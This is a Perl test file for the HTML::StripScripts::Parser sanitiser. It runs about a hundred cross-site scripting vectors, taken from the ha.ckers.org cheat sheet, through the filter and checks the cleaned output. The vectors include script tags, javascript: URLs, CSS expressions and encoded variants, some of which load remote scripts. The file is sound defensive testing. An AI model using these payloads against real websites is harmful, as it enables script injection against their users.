use strict;
use Test::More tests => 100;

BEGIN { $^W = 1 }

use HTML::StripScripts::Parser;

my @tests;
my $p =
    HTML::StripScripts::Parser->new( { AllowHref       => 1,
                                       AllowRelURL     => 1,
                                       AllowMailto     => 1,
                                       strict_names    => 1,
                                       strict_comments => 1,
                                     }
    );

isa_ok( $p, "HTML::StripScripts::Parser" );

my $i = 0;
while (@tests) {
    $i++;
    my $in     = shift @tests;
    my $out    = shift @tests;
    my $result = $p->filter_html($in);
    is( $result, $out, "xss $i" );
}

# These XSS tests are from http://ha.ckers.org/xss.html
# I have excluded the google.com URL tests, as all of them are valid URLs (I think)

BEGIN {
    @tests = (

        #  1
        q{';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&\{\}},
        q{&#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;<!--filtered-->&quot;&gt;&#39;&gt;<!--filtered--><!--filtered-->=&amp;{}},

        #  2
        q{'';!--"<XSS>=&\{()\}},
        q{&#39;&#39;;!--&quot;<!--filtered-->=&amp;{()}},

        #  3
        q{<SCRIPT>alert('XSS')</SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        #  4
        q{<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        #  5
        q{<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        #  6
        q{<BASE HREF="javascript:alert('XSS');//">},
        q{<!--filtered-->},

        #  7
        q{<BGSOUND SRC="javascript:alert('XSS');">},
        q{<!--filtered-->},

        #  8
        q{<BODY BACKGROUND="javascript:alert('XSS');">},
        q{<!--filtered-->},

        #  9
        q{<BODY ONLOAD=alert('XSS')>},
        q{<!--filtered-->},

        # 10
        q{<DIV STYLE="background-image: url(javascript:alert('XSS'))">},
        q{<div style=""></div>},

        # 11
        q{<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">},
        q{<div style=""></div>},

        # 12
        q{<DIV STYLE="width: expression(alert('XSS'));">},
        q{<div style=""></div>},

        # 13
        q{<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>},
        q{<!--filtered--><!--filtered--><!--filtered-->},

        # 14
        q{<IFRAME SRC="javascript:alert('XSS');"></IFRAME>},
        q{<!--filtered--><!--filtered-->},

        # 15
        q{<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">},
        q{<!--filtered-->},

        # 16
        q{<IMG SRC="javascript:alert('XSS');">},
        q{<img />},

        # 17
        q{<IMG SRC=javascript:alert('XSS')>},
        q{<img />},

        # 18
        q{<IMG DYNSRC="javascript:alert('XSS');">},
        q{<img />},

        # 19
        q{<IMG LOWSRC="javascript:alert('XSS');">},
        q{<img />},

        # 20
        q{exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE>li \{list-style-image: url("javascript:alert('XSS')");\}</STYLE><UL><LI>XSS},
        q{exp/*<!--filtered--><!--filtered--><!--filtered-->},

        # 21
        q{<IMG SRC='vbscript:msgbox("XSS")'>},
        q{<img />},

        # 22
        q{<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>},
        q{<!--filtered--><!--filtered-->},

        # 23
        q{<IMG SRC="livescript:[code]">},
        q{<img />},

        # 24
        q{<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">},
        q{<!--filtered-->},

        # 25
        q{<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">},
        q{<!--filtered-->},

        # 26
        q{<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">},
        q{<!--filtered-->},

        # 27
        q{<IMG SRC="mocha:[code]">},
        q{<img />},

        # 28
        q{<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>},
        q{<!--filtered--><!--filtered-->},

        # 29
        q{<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>},
        q{<!--filtered--><!--filtered--><!--filtered-->},

        # 30
        q{<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>},
        q{<!--filtered--><!--filtered-->},

        # 31
        q{a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";},
        q{a=&quot;get&quot;;
b=&quot;URL(&quot;&quot;;
c=&quot;javascript:&quot;;
d=&quot;alert(&#39;XSS&#39;);&quot;)&quot;;},

        # 32
        q{<STYLE TYPE="text/javascript">alert('XSS');</STYLE>},
        q{<!--filtered--><!--filtered-->},

        # 33
        q{<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">},
        q{<img />},

        # 34
        q{<XSS STYLE="xss:expression(alert('XSS'))">},
        q{<!--filtered-->},

        # 35
        q{<STYLE>.XSS\{background-image:url("javascript:alert('XSS')");\}</STYLE><A CLASS=XSS></A>},
        q{<!--filtered--><!--filtered--><a></a>},

        # 36
        q{<STYLE type="text/css">BODY\{background:url("javascript:alert('XSS')")\}</STYLE>},
        q{<!--filtered--><!--filtered-->},

        # 37
        q{<LINK REL="stylesheet" HREF="javascript:alert('XSS');">},
        q{<!--filtered-->},

        # 38
        q{<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">},
        q{<!--filtered-->},

        # 39
        q{<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>},
        q{<!--filtered--><!--filtered-->},

        # 40
        q{<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">},
        q{<!--filtered-->},

        # 41
        q{<STYLE>BODY\{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")\}</STYLE>},
        q{<!--filtered--><!--filtered-->},

        # 42
        q{<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>},
        q{<table></table>},

        # 43
        q{<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>},
        q{<table><!--filtered--><!--filtered--></table>},

        # 44
        q{<HTML xmlns:xss>},
        q{<!--filtered-->},

        # 45
        q{<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>},
        q{<!--filtered--><!--filtered--><!--filtered--><!--filtered--><!--filtered-->]]&gt;},

        # 46
        q{<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>},
        q{<!--filtered--><i><b><img /></b></i><!--filtered-->},

        # 47
        q{<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>},
        q{<!--filtered--><!--filtered-->},

        # 48
        q{<HTML><BODY>},
        q{<!--filtered--><!--filtered-->},

        # 49
        q{<!--[if gte IE 4]>},
        q{<!--filtered-->},

        # 50
        q{<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">},
        q{<!--filtered-->},

        # 51
        q{<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">},
        q{<!--filtered-->},

        # 52
        q{<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 53
        q{<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->},
        q{<!--filtered--><!--filtered--><!--filtered-->&#39;&quot;--&gt;},

        # 54
        q{<? echo('<SCR)';},
        q{<!--filtered-->},

        # 55
        q{<BR SIZE="&\{alert('XSS')\}">},
        q{<br />},

        # 56
        q{<},
        q{<!--filtered-->},

        # 57
        q{<IMG SRC=JaVaScRiPt:alert('XSS')>},
        q{<img />},

        # 58
        q{<IMG SRC=javascript:alert(&quot;XSS&quot;)>},
        q{<img />},

        # 59
        q{<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>},
        q{<img />},

        # 60
        q{<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>},
        q{<img />},

        # 61
        q{<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>},
        q{<img />},

        # 62
        q{<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>},
        q{<img />},

        # 63
        q{<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">},
        q{<div style=""></div>},

        # 64
        q{<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>},
        q{<img />},

        # 65
        q{<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-},
        q{<!--filtered--><!--filtered--> <!--filtered-->+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-},

        # 66
        q{\";alert('XSS');//},
        q{\&quot;;alert(&#39;XSS&#39;);//},

        # 67
        q{</TITLE><SCRIPT>alert("XSS");</SCRIPT>},
        q{<!--filtered--><!--filtered--><!--filtered-->},

        # 68
        q{<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>},
        q{<!--filtered--><!--filtered-->},

        # 69
        q{<IMG SRC="jav    ascript:alert('XSS');">},
        q{<img />},

        # 70
        q{<IMG SRC="jav&#x09;ascript:alert('XSS');">},
        q{<img />},

        # 71
        q{<IMG SRC="jav&#x0A;ascript:alert('XSS');">},
        q{<img />},

        # 72
        q{<IMG SRC="jav&#x0D;ascript:alert('XSS');">},
        q{<img />},

        # 73
        q{<IMG},
        q{<!--filtered-->},

        # 74
        q{perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out},
        q{perl -e &#39;print &quot;<img />&quot;;&#39;&gt; out},

        # 75
        q{perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out},
        q{perl -e &#39;print &quot;&amp;<!--filtered-->alert(&quot;XSS&quot;)<!--filtered-->&quot;;&#39; &gt; out},

        # 76
        q{<IMG SRC=" &#14;  javascript:alert('XSS');">},
        q{<img />},

        # 77
        q{<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 78
        q{<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>},
        q{<!--filtered-->},

        # 79
        q{<SCRIPT SRC=http://ha.ckers.org/xss.js},
        q{<!--filtered-->},

        # 80
        q{<SCRIPT SRC=//ha.ckers.org/.j>},
        q{<!--filtered-->},

        # 81
        q{<IMG SRC="javascript:alert('XSS')"},
        q{<!--filtered-->},

        # 82
        q{<IFRAME SRC=http://ha.ckers.org/scriptlet.html <},
        q{<!--filtered-->},

        # 83
        q{<<SCRIPT>alert("XSS");//<</SCRIPT>},
        q{&lt;<!--filtered--><!--filtered-->},

        # 84
        q{<IMG """><SCRIPT>alert("XSS")</SCRIPT>">},
        q{<img /><!--filtered--><!--filtered-->&quot;&gt;},

        # 85
        q{<SCRIPT>a=/XSS/},
        q{<!--filtered--><!--filtered-->},

        # 86
        q{<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 87
        q{<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 88
        q{<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 89
        q{<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 90
        q{<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 91
        q{<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;<!--filtered-->},

        # 92
        q{<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>},
        q{<!--filtered--><!--filtered-->},

        # 93
        q{<A HREF="h},
        q{<!--filtered-->},

        # 94
        q{<A HREF="http://ha.ckers.org@google">XSS</A>},
        q{<a>XSS</a>},

        # 95
        q{<A HREF="http://google:ha.ckers.org">XSS</A>},
        q{<a>XSS</a>},

        # 96
        q{<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>},
        q{<a>XSS</a>},

        # 97
        q{<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>},
        q{<a>XSS</a>},

        # 98
        q{<img alt="test&#10;test" />},
        q{<img alt="test test" />},

        # 99
        q{<img alt=test&#10;test />},
        q{<img alt="test&amp;#10;test" />},

    );
}
